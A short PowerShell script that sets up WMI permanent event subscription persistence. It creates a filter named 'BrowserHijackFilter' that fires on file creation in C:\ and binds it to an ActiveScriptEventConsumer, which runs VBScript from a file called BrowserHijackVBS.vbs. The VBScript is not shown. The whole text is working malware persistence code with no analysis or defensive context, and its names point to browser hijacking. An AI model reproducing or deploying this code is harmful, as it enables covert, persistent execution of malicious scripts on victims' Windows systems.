
$query = @"
 Select * from __InstanceCreationEvent within 30

 where targetInstance isa 'Cim_DirectoryContainsFile'

 and targetInstance.GroupComponent = 'Win32_Directory.Name="C:\\\\"'
"@

$filterParam = @{
    QueryLanguage = "WQL"
    Query = $query
    Name = "BrowserHijackFilter"
    EventNameSpace = "root/CIMV2"
}
$filter = New-CimInstance -ClassName __EventFilter -Namespace root/subscription  -Property $filterParam

$vbs = Get-Content BrowserHijackVBS.vbs | Out-String
 $consumerParam = @{
    Name = "BrowserHijackConsumer"
    ScriptText = $vbs
    ScriptingEngine="VBScript"
 }

 $consumer = New-CimInstance -ClassName ActiveScriptEventConsumer -Namespace root/subscription  -Property $consumerParam


 $bindingParam = @{
    Filter = [ref]$filter
    Consumer = [ref]$consumer
 }

 New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root/subscription  -Property $bindingParam | out-null

